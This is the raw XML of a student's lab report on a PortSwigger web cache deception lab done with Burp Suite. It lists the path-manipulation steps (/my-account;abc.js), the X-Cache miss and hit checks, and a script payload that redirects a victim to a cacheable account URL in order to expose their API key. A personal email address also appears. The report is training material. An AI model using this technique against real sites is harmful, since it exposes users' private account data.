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DA3D" w14:textId="240126A8" w:rsidR="00944003" w:rsidRDefault="00944003" w:rsidP="00944003">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Emil: </w:t>
      </w:r>
      <w:hyperlink r:id="rId8" w:history="1">
        <w:r w:rsidRPr="001F4CDA">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>aakashsinghrajput8610@gmail.com</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="223401EE" w14:textId="31F15BA5" w:rsidR="00944003" w:rsidRPr="00944003" w:rsidRDefault="00944003" w:rsidP="00944003">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00944003">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Name: Aakash Singh</w:t>
      </w:r>
      <w:r w:rsidRPr="00944003">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>Lab: Cache Poisoning</w:t>
      </w:r>
      <w:r w:rsidRPr="00944003">
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br/>
        <w:t>Tool Used: Burp Suite</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DC8B6B7" w14:textId="7AC42496" w:rsidR="00A8710E" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Objective</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58166D29" w14:textId="77777777" w:rsidR="00A8710E" w:rsidRDefault="00000000">
      <w:r>
        <w:t>To identify and exploit a web cache deception vulnerability to retrieve sensitive information (API key).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C03935" w14:textId="6CACC781" w:rsidR="00A8710E" w:rsidRDefault="00A829B6">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Test Credentials</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E5F590D" w14:textId="6AF54180" w:rsidR="00A8710E" w:rsidRDefault="00A829B6">
      <w:r>
        <w:t>Login with the Username: wiener</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>Password: peter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1530092A" w14:textId="5E1313D1" w:rsidR="00A829B6" w:rsidRDefault="00774B8C">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1CEC116B" wp14:editId="41A115C7">
            <wp:extent cx="5486400" cy="2846070"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="21803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32747" name="Picture 2180327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AA37" w14:textId="77777777" w:rsidR="00A829B6" w:rsidRDefault="0000000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/>
      </w:r>
      <w:r w:rsidRPr="00A829B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</w:p>
    <w:p w14:paraId="56622845" w14:textId="77777777" w:rsidR="00A829B6" w:rsidRDefault="00A829B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A7CFE1B" w14:textId="77777777" w:rsidR="00A829B6" w:rsidRDefault="00A829B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3950327" w14:textId="77777777" w:rsidR="00A829B6" w:rsidRDefault="00A829B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B56F6FC" w14:textId="77777777" w:rsidR="00A829B6" w:rsidRDefault="00A829B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5F0E848" w14:textId="77777777" w:rsidR="00A829B6" w:rsidRDefault="00A829B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E03A55C" w14:textId="124E03B5" w:rsidR="00A829B6" w:rsidRDefault="00000000">
      <w:r w:rsidRPr="00A829B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Step 2: Send Request to Repeater</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Go to Proxy &gt; HTTP History.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Right-click GET /my-account request → Send to Repeater.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="340E295D" w14:textId="77777777" w:rsidR="00A829B6" w:rsidRDefault="00A829B6"/>
    <w:p w14:paraId="7A0D5F53" w14:textId="2AF55C7C" w:rsidR="00A829B6" w:rsidRPr="00774B8C" w:rsidRDefault="00774B8C" w:rsidP="00774B8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15267557" wp14:editId="2497A3AE">
            <wp:extent cx="5486400" cy="2691765"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="646081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81329" name="Picture 6460813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9B6">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00A829B6">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00A829B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Step 3: Path Manipulation Test</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>- Modify path: /my-account/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>abc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">-It showing the 404 error code </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FECCD38" w14:textId="4A8DF341" w:rsidR="000D0F0A" w:rsidRPr="000D0F0A" w:rsidRDefault="00774B8C" w:rsidP="000D0F0A">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="53CFD647" wp14:editId="347225D9">
            <wp:extent cx="5484922" cy="2532185"/>
            <wp:effectExtent l="0" t="0" r="1905" b="1905"/>
            <wp:docPr id="792868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68463" name="Picture 7928684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1346" cy="254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9B6">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00A829B6">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00A829B6">
        <w:lastRenderedPageBreak/>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00A829B6">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00A829B6" w:rsidRPr="00A829B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Step </w:t>
      </w:r>
      <w:r w:rsidR="0089725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4</w:t>
      </w:r>
      <w:r w:rsidR="00A829B6" w:rsidRPr="00A829B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 Exploit Creation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34CB9679" w14:textId="14944D91" w:rsidR="000D0F0A" w:rsidRPr="000D0F0A" w:rsidRDefault="000D0F0A" w:rsidP="000D0F0A">
      <w:r>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidRPr="000D0F0A">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000D0F0A">
        <w:t>my-account?abc.js</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0158765A" w14:textId="18707EC2" w:rsidR="000D0F0A" w:rsidRPr="000D0F0A" w:rsidRDefault="000D0F0A" w:rsidP="000D0F0A">
      <w:r>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidRPr="000D0F0A">
        <w:t>/my-account;abc.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57B467FC" w14:textId="39C11EBB" w:rsidR="00A829B6" w:rsidRDefault="00774B8C">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5BE0FA0D" wp14:editId="3075F69F">
            <wp:extent cx="5486400" cy="2826385"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1807946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46363" name="Picture 180794636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46E2" w14:textId="7204BDE0" w:rsidR="000D0F0A" w:rsidRDefault="00000000" w:rsidP="000D0F0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/>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D0F0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Step </w:t>
      </w:r>
      <w:r w:rsidR="0089725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5</w:t>
      </w:r>
      <w:r w:rsidRPr="000D0F0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  <w:r w:rsidR="000D0F0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-Cache find.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F75CCEF" w14:textId="0F876FE4" w:rsidR="000D0F0A" w:rsidRPr="000D0F0A" w:rsidRDefault="000D0F0A" w:rsidP="000D0F0A">
      <w:r w:rsidRPr="000D0F0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D0F0A">
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000D0F0A">
        <w:t>my-account?abc.j</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6543E8E7" w14:textId="77777777" w:rsidR="000D0F0A" w:rsidRPr="000D0F0A" w:rsidRDefault="000D0F0A" w:rsidP="000D0F0A">
      <w:r w:rsidRPr="000D0F0A">
        <w:t>/my-account;abc.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="794ADE53" w14:textId="77777777" w:rsidR="000D0F0A" w:rsidRPr="000D0F0A" w:rsidRDefault="000D0F0A" w:rsidP="000D0F0A">
      <w:r w:rsidRPr="000D0F0A">
        <w:t>Response header:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48401262" w14:textId="77777777" w:rsidR="000D0F0A" w:rsidRPr="000D0F0A" w:rsidRDefault="000D0F0A" w:rsidP="000D0F0A">
      <w:r w:rsidRPr="000D0F0A">
        <w:t>X-Cache: miss</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0E19BC" w14:textId="77777777" w:rsidR="000D0F0A" w:rsidRPr="000D0F0A" w:rsidRDefault="000D0F0A" w:rsidP="000D0F0A">
      <w:r w:rsidRPr="000D0F0A">
        <w:t>Send again:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F029A8" w14:textId="225BE0DC" w:rsidR="00A829B6" w:rsidRDefault="000D0F0A">
      <w:r w:rsidRPr="000D0F0A">
        <w:t>X-Cache: hit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CFC56C2" w14:textId="5EE53E8B" w:rsidR="00A8710E" w:rsidRDefault="00774B8C">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1B9D50E3" wp14:editId="0EE0EA51">
            <wp:extent cx="5486400" cy="2834640"/>
            <wp:effectExtent l="0" t="0" r="0" b="3810"/>
            <wp:docPr id="2121777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77992" name="Picture 21217779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9B6">
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5155512B" w14:textId="6B98DFBC" w:rsidR="00A8710E" w:rsidRPr="000D0F0A" w:rsidRDefault="000D0F0A" w:rsidP="000D0F0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D0F0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Step </w:t>
      </w:r>
      <w:r w:rsidR="0089725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6</w:t>
      </w:r>
      <w:r w:rsidRPr="000D0F0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 - Craft payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4395F357" w14:textId="376BF95B" w:rsidR="000D0F0A" w:rsidRPr="000D0F0A" w:rsidRDefault="000D0F0A" w:rsidP="000D0F0A">
      <w:r w:rsidRPr="000D0F0A">
        <w:t>&lt;script&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D0F0A">
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="000D0F0A">
        <w:t>document.location</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="000D0F0A">
        <w:t>="https://</w:t>
      </w:r>
      <w:r w:rsidR="000D12AE" w:rsidRPr="000D12AE">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000D12AE" w:rsidRPr="00337BC1">
        <w:t>0acc001do3fd894680871214008200ee</w:t>
      </w:r>
      <w:r w:rsidRPr="000D0F0A">
        <w:t>.web-security-academy.net/my-account;wcd.js"</w:t>
      </w:r>
      <w:r w:rsidRPr="000D0F0A">
        <w:br/>
        <w:t>&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F187AC9" w14:textId="742209C9" w:rsidR="00A8710E" w:rsidRDefault="00774B8C">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="58DE5D1A" wp14:editId="2E27242E">
            <wp:extent cx="5486400" cy="2833370"/>
            <wp:effectExtent l="0" t="0" r="0" b="5080"/>
            <wp:docPr id="2022495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95903" name="Picture 20224959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1A2A" w14:textId="38C04141" w:rsidR="00774B8C" w:rsidRDefault="00774B8C"/>
    <w:p w14:paraId="5C6E915E" w14:textId="77777777" w:rsidR="000D0F0A" w:rsidRDefault="000D0F0A"/>
    <w:p w14:paraId="5A269B7B" w14:textId="77777777" w:rsidR="000D0F0A" w:rsidRDefault="000D0F0A"/>
    <w:p w14:paraId="033BB7D9" w14:textId="4E32F414" w:rsidR="000D0F0A" w:rsidRPr="000D0F0A" w:rsidRDefault="000D0F0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D0F0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 xml:space="preserve">Step </w:t>
      </w:r>
      <w:r w:rsidR="0089725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7</w:t>
      </w:r>
      <w:r w:rsidRPr="000D0F0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: -Exploit </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="493A487F" w14:textId="29B363DE" w:rsidR="000D0F0A" w:rsidRDefault="00BC5245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2ED5898" wp14:editId="68686B95">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1676169</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>248508</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="98640" cy="22320"/>
                <wp:effectExtent l="95250" t="152400" r="92075" b="149225"/>
                <wp:wrapNone/>
                <wp:docPr id="57683699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864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8619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127.75pt;margin-top:11.05pt;width:16.25pt;height:18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F35731C" wp14:editId="2C23A0EE">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1676169</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>270828</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="360" cy="360"/>
                <wp:effectExtent l="95250" t="152400" r="95250" b="152400"/>
                <wp:wrapNone/>
                <wp:docPr id="1995656622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0472E" id="Ink 19" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:127.75pt;margin-top:12.85pt;width:8.55pt;height:17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2AE9B6B" wp14:editId="70131F44">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1608489</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>264708</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="324000" cy="11880"/>
                <wp:effectExtent l="95250" t="152400" r="95250" b="160020"/>
                <wp:wrapNone/>
                <wp:docPr id="213317415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240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A185C" id="Ink 18" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:122.4pt;margin-top:12.35pt;width:34pt;height:17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6533335" wp14:editId="1117A98A">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1491129</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>292788</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="360" cy="360"/>
                <wp:effectExtent l="95250" t="152400" r="95250" b="152400"/>
                <wp:wrapNone/>
                <wp:docPr id="104016948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CD2AA" id="Ink 17" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:113.15pt;margin-top:14.55pt;width:8.55pt;height:17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63F0A4C" wp14:editId="56816E48">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1491129</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>292788</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="360" cy="360"/>
                <wp:effectExtent l="95250" t="152400" r="95250" b="152400"/>
                <wp:wrapNone/>
                <wp:docPr id="16536993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6556F" id="Ink 16" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:113.15pt;margin-top:14.55pt;width:8.55pt;height:17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309F5E9" wp14:editId="3F3F4434">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1060929</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>295668</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="426960" cy="302040"/>
                <wp:effectExtent l="95250" t="152400" r="106680" b="155575"/>
                <wp:wrapNone/>
                <wp:docPr id="133772633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26960" cy="30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671C9" id="Ink 15" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:79.35pt;margin-top:14.8pt;width:42.1pt;height:40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">
                <v:imagedata r:id="rId24" o:title=""/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="000D0F0A">
        <w:t xml:space="preserve">Use your deliver payload to victim </w:t>
      </w:r>
      <w:r w:rsidR="000D0F0A" w:rsidRPr="000D0F0A">
        <w:t>https://</w:t>
      </w:r>
      <w:r w:rsidR="00337BC1" w:rsidRPr="00337BC1">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00337BC1" w:rsidRPr="00337BC1">
        <w:t>0acc001do3fd894680871214008200ee</w:t>
      </w:r>
      <w:r w:rsidR="000D0F0A" w:rsidRPr="000D0F0A">
        <w:t>.web-security-academy.net/my-account;</w:t>
      </w:r>
      <w:r>
        <w:t>omg</w:t>
      </w:r>
      <w:r w:rsidR="000D0F0A" w:rsidRPr="000D0F0A">
        <w:t>.js</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6898CBF9" w14:textId="2F810EF9" w:rsidR="00774B8C" w:rsidRDefault="00BC5245"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3815DAB" wp14:editId="0C374238">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>1572260</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>27940</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="533400" cy="635"/>
                <wp:effectExtent l="133350" t="133350" r="95250" b="132715"/>
                <wp:wrapNone/>
                <wp:docPr id="6392467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334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696B9" id="Ink 28" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:118.85pt;margin-top:-6.55pt;width:51.9pt;height:17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096BC7D" wp14:editId="4B7F4729">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>4174569</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>-64247</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1361520" cy="300600"/>
                <wp:effectExtent l="133350" t="133350" r="124460" b="137795"/>
                <wp:wrapNone/>
                <wp:docPr id="54153169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361520" cy="30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91B10" id="Ink 26" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:323.75pt;margin-top:-10pt;width:117.1pt;height:33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3415FC8" wp14:editId="26E4334E">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>2122569</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>12073</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3056760" cy="78480"/>
                <wp:effectExtent l="133350" t="133350" r="29845" b="131445"/>
                <wp:wrapNone/>
                <wp:docPr id="860519843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05676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AF222" id="Ink 25" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:162.2pt;margin-top:-4pt;width:250.65pt;height:16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2ED5589" wp14:editId="62F2BDF0">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>59769</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>125473</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1017360" cy="6840"/>
                <wp:effectExtent l="133350" t="133350" r="87630" b="127000"/>
                <wp:wrapNone/>
                <wp:docPr id="206277136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0173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C9028" id="Ink 24" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:-.25pt;margin-top:4.95pt;width:90pt;height:10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28F8458" wp14:editId="22783804">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-1685290</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>-91440</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="6007735" cy="307340"/>
                <wp:effectExtent l="133350" t="133350" r="145415" b="149860"/>
                <wp:wrapNone/>
                <wp:docPr id="2396357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007735" cy="3073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58350" id="Ink 23" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:-137.65pt;margin-top:-11.9pt;width:482.9pt;height:3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3D932BB" wp14:editId="39517DB9">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>843489</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>61033</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="360" cy="360"/>
                <wp:effectExtent l="95250" t="152400" r="95250" b="152400"/>
                <wp:wrapNone/>
                <wp:docPr id="175259697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A31B7" id="Ink 14" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:62.15pt;margin-top:-3.7pt;width:8.55pt;height:17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E06F351" wp14:editId="0EB860BB">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>843489</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>61033</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="360" cy="360"/>
                <wp:effectExtent l="95250" t="152400" r="95250" b="152400"/>
                <wp:wrapNone/>
                <wp:docPr id="81257147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C846B" id="Ink 13" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:62.15pt;margin-top:-3.7pt;width:8.55pt;height:1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544E3E2" wp14:editId="5805B175">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>533169</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>110353</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="360" cy="360"/>
                <wp:effectExtent l="95250" t="152400" r="95250" b="152400"/>
                <wp:wrapNone/>
                <wp:docPr id="127877202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26BC5" id="Ink 12" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:37.75pt;margin-top:.2pt;width:8.55pt;height:17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8ECCECE" wp14:editId="486658BD">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>533169</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>110353</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="360" cy="360"/>
                <wp:effectExtent l="95250" t="152400" r="95250" b="152400"/>
                <wp:wrapNone/>
                <wp:docPr id="135841816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6EDEA" id="Ink 11" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:37.75pt;margin-top:.2pt;width:8.55pt;height:1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3482FB3" wp14:editId="7CD06853">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>533169</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>110353</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="360" cy="360"/>
                <wp:effectExtent l="95250" t="152400" r="95250" b="152400"/>
                <wp:wrapNone/>
                <wp:docPr id="181821020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666AD" id="Ink 10" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:37.75pt;margin-top:.2pt;width:8.55pt;height:17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62FAC5C" wp14:editId="54F662EA">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>533169</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>110353</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="360" cy="360"/>
                <wp:effectExtent l="95250" t="152400" r="95250" b="152400"/>
                <wp:wrapNone/>
                <wp:docPr id="30836832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AFD1E" id="Ink 9" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:37.75pt;margin-top:.2pt;width:8.55pt;height:17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8B511FD" wp14:editId="1C669B26">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>375129</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>104953</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="360" cy="360"/>
                <wp:effectExtent l="95250" t="152400" r="95250" b="152400"/>
                <wp:wrapNone/>
                <wp:docPr id="212061773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ECD00" id="Ink 8" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:25.35pt;margin-top:-.25pt;width:8.55pt;height:17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EC5E687" wp14:editId="72AF6DA1">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>375129</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>104953</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="360" cy="360"/>
                <wp:effectExtent l="95250" t="152400" r="95250" b="152400"/>
                <wp:wrapNone/>
                <wp:docPr id="46713764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07693" id="Ink 7" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:25.35pt;margin-top:-.25pt;width:8.55pt;height:17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1F1556E" wp14:editId="2150A632">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>184689</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>72193</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="185400" cy="30960"/>
                <wp:effectExtent l="95250" t="152400" r="100965" b="160020"/>
                <wp:wrapNone/>
                <wp:docPr id="155926835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8540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D379E" id="Ink 6" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:10.3pt;margin-top:-2.8pt;width:23.1pt;height:19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E17ECA4" wp14:editId="7AF5200B">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>184689</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>72193</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="360" cy="360"/>
                <wp:effectExtent l="95250" t="152400" r="95250" b="152400"/>
                <wp:wrapNone/>
                <wp:docPr id="85738724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3560F" id="Ink 5" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:10.3pt;margin-top:-2.8pt;width:8.5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4EEEC51" wp14:editId="7307F73C">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>184689</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>72193</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="360" cy="360"/>
                <wp:effectExtent l="95250" t="152400" r="95250" b="152400"/>
                <wp:wrapNone/>
                <wp:docPr id="45712340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6F6B9" id="Ink 4" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:10.3pt;margin-top:-2.8pt;width:8.5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6D8FD3A" wp14:editId="12943A32">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>184689</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>72193</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="360" cy="360"/>
                <wp:effectExtent l="95250" t="152400" r="95250" b="152400"/>
                <wp:wrapNone/>
                <wp:docPr id="173377340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BE7F6" id="Ink 3" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:10.3pt;margin-top:-2.8pt;width:8.55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3172BB8" wp14:editId="26D91331">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>70569</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>72193</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="108720" cy="360"/>
                <wp:effectExtent l="95250" t="152400" r="100965" b="152400"/>
                <wp:wrapNone/>
                <wp:docPr id="71330669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08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5F188" id="Ink 2" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:1.3pt;margin-top:-2.8pt;width:17.05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7A842B8" wp14:editId="154A5F1B">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-76671</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>22513</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="371520" cy="46080"/>
                <wp:effectExtent l="95250" t="152400" r="0" b="163830"/>
                <wp:wrapNone/>
                <wp:docPr id="106929990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7152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68AAB" id="Ink 1" o:spid="_x0000_s1026" type="#_x0000_t75" style="position:absolute;margin-left:-10.25pt;margin-top:-6.75pt;width:37.75pt;height:2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">
                <v:imagedata r:id="rId51" o:title=""/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00774B8C">
        <w:rPr>
